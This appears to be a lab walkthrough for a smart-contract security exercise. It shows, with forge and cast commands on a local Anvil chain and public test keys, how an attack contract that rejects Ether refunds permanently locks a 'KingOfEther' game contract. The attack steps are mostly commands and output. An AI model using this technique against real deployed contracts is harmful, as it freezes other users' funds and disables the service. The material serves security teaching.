## Denial of Service Attack

**Reference:** https://solidity-by-example.org/hacks/denial-of-service/

This demonstrates a **Denial of Service (DoS)** vulnerability where a malicious contract can permanently lock a legitimate contract by refusing to accept Ether refunds.

### 🎯 The Scenario

`KingOfEther` is a game where:
- Anyone can become king by sending more Ether than the previous king
- The previous king gets refunded when someone new claims the throne
- **The vulnerability:** If the current king can't receive Ether, the entire contract becomes unusable!

---

### 🚀 Setup

**Start Anvil (local blockchain)**

```bash
anvil
```

**Deploy the KingOfEther Contract**

```bash
forge create src/denialOfService/DenialOfService.sol:KingOfEther\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast

  # Contract deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

---

### 👑 Normal Operation (Before Attack)

#### Step 1: Alice Becomes King (1 ETH)

**Alice's Details:**
- Address: `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`
- Private Key: `0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80`

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "claimThrone()" \
  --value 1ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

**Verify contract balance:**

```bash
cast balance 0x5FbDB2315678afecb367f032d93F642f64180aa3 -e
# 1.000000000000000000
# The 1 ETH stays in the contract as Alice's bid
```

💡 **Why does the contract keep the 1 ETH?** When `king.call{value: balance}("")` executes, `balance` is 0 and `king` is address(0), so no refund is sent. The contract holds Alice's bid.

**Verify Alice is king:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
   "king()" \
   --rpc-url http://127.0.0.1:8545
# 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266 ✓
```

#### Step 2: Bob Becomes King (2 ETH)

**Bob's Details:**
- Address: `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`
- Private Key: `0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d`

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "claimThrone()" \
  --value 2ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

**Verify Bob is king:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
   "king()" \
   --rpc-url http://127.0.0.1:8545
# 0x00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8 ✓
```

**Verify Alice received her refund:**

```bash
cast balance 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 -e
# 9999.999662429251757805
# Alice got her 1 ETH back (minus gas fees) ✓
```

---

### ⚔️ The Attack

#### Step 3: Deploy the Attack Contract

```bash
forge create src/denialOfService/DenialOfService.sol:Attack\
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast \
  --constructor-args  0x5FbDB2315678afecb367f032d93F642f64180aa3
  
  # Contract deployed to: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
```

#### Step 4: Attack Contract Claims Throne (3 ETH)

**Attacker's Details:**
- Address: `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC`
- Private Key: `0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a`

```bash
cast send 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
  "attack()" \
  --value 3ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
```

**Verify Attack contract is now king:**

```bash
cast call 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
   "king()" \
   --rpc-url http://127.0.0.1:8545
# 0x0000000000000000000000009fe46736679d2d9a65f0992f2272de9f3c7fa6e0 ✓
```

---

### 🔒 Contract is Now Permanently Locked!

#### Step 5: Try to Claim Throne (Will Fail!)

**Mario's Details:**
- Address: `0x90F79bf6EB2c4f870365E785982E1f101E93b906`
- Private Key: `0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6`

```bash
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  "claimThrone()" \
  --value 4ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6
```

**Result: ❌ Transaction Fails!**

```
Error: Failed to estimate gas: server returned an error response: error code 3: 
execution reverted: Failed to send Ether
```

---

### 🔍 What's Happening?

**The Attack Flow:**

1. **Attack contract is the current king** (claimed throne with 3 ETH)

2. **Mario tries to claim throne** with 4 ETH (valid bid)

3. **Contract tries to refund the Attack contract:**
   ```solidity
   (bool sent,) = king.call{value: balance}("");
   ```

4. **❌ Attack contract CANNOT receive Ether!**
   - No `receive()` function
   - No `fallback()` function
   - Transfer fails!

5. **Transaction reverts:**
   ```solidity
   require(sent, "Failed to send Ether"); // ← Fails here!
   ```

### 🎯 Impact

**The throne is permanently locked!** 🔒

- ❌ No one can ever become king again
- ❌ Every `claimThrone()` attempt will fail
- ❌ The 3 ETH is stuck in the contract forever
- ✓ DoS attack successful!

**Why it works:**
- Every new king attempt tries to refund the current king
- Attack contract rejects all Ether transfers
- The entire transaction reverts
- The contract becomes **unusable for everyone**

---

